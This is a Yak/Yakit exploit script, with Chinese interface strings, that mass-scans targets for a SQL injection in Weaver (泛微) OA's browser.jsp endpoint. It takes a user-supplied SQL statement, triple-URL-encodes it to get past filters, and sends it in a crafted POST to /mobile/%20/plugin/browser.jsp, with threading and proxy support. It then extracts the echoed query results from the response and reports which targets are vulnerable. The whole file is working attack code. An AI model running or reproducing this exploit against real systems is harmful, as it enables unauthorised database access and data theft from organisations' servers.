yakit.AutoInitYakit()

yakit.EnableTable("泛微browser.jsp注入绕过结果", ["目标URL", "是否存在漏洞","注入回显信息"])

targets = cli.String("targets") 
targets = str.Split(targets, "\n") 
proxy = cli.String("proxy")
threads = cli.Int("threads")
sql = cli.String("sql")
file_path = cli.String("file_path")
cli.check()

if str.Contains(targets[0],"scan") && file.IsExisted(file_path){
    if len(file.ReadLines(file_path)) != 0 {
        targets = file.ReadLines(file_path)
    }else{
        targets = ""
        yakit.Error("大佬，目标文件啥都没有，看了个寂寞")
    }
}else{
    if file_path != ""{
        yakit.Error("大佬，目标文件不存在，看一下")
    }
}

if sql != ""{
    sql = codec.EncodeUrl(codec.EncodeUrl(codec.EncodeUrl(sql)))
}else{
    targets = ""
    yakit.Error("sql语句为空,大佬写一下sql语句，记得闭合！！")
}

def POC(target){
ip, port, err := str.ParseStringToHostPort(target)
if err != nil {
    unport := sprintf("%v",err)
    if str.Contains(unport,"unknown port for"){
        ip = target
        port = "80"
        target = "http://"+ip
    }else{
        yakit.Info("[-] IP和端口提取失败,失败原因：%v",err)
    } 
}
host := str.HostPort(ip, port)
if proxy == "" {
    rsp, req, err := poc.HTTP(`
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: {{param(host)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1141

isDis=1&browserTypeId=269&keyword={{param(sql)}}
`, poc.params({
    "host": host,
    "sql":sql
}))
    if err != nil {
        yakit.Info("[-] 目标%v 访问失败",target)
    }else{
        yakit.Info("[+] 目标%v 访问成功",target)
    }
    json_data(target,rsp)
}else{
    rsp, req, err := poc.HTTP(`
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: {{param(host)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1141

isDis=1&browserTypeId=269&keyword={{param(sql)}}
`, poc.params({
    "host": host,
    "sql":sql
}),poc.proxy(proxy))
    if err != nil {
        yakit.Info("[-] 目标%v 访问失败",target)
    }else{
        yakit.Info("[+] 目标%v 访问成功",target)
    }
    json_data(target,rsp)
}
}

def json_data(target,rsp){
    header, body = poc.Split(rsp)
    flag := false
    vul_body = json.loads(string(body))

    try{
        flag = true
        result_out(target,flag,vul_body.result[0]["show1"])
    } catch err {
        flag = false
        result_out(target,flag,"无")
    }
}



def result_out(url,flag,vul_message){
    data := make(map[string]var)
    data["目标URL"] = url
    data["注入回显信息"] = vul_message
    if flag {
        data["是否存在漏洞"] = "可能存在漏洞"
        yakit.Info("[+] 目标%v 存在漏洞",url)
    }else{
        data["是否存在漏洞"] = "不存在漏洞"
        yakit.Info("[-] 目标%v 不存在漏洞",url)
    }
    yakit.Output(yakit.TableData("泛微browser.jsp注入绕过结果", data))
}

def threadstask(url){
        swg.Add()
        go fn{
            defer swg.Done()
            POC(url)
        }
}

swg = sync.NewSizedWaitGroup(threads)
for _,url = range targets{
    threadstask(url) 
}
swg.Wait()
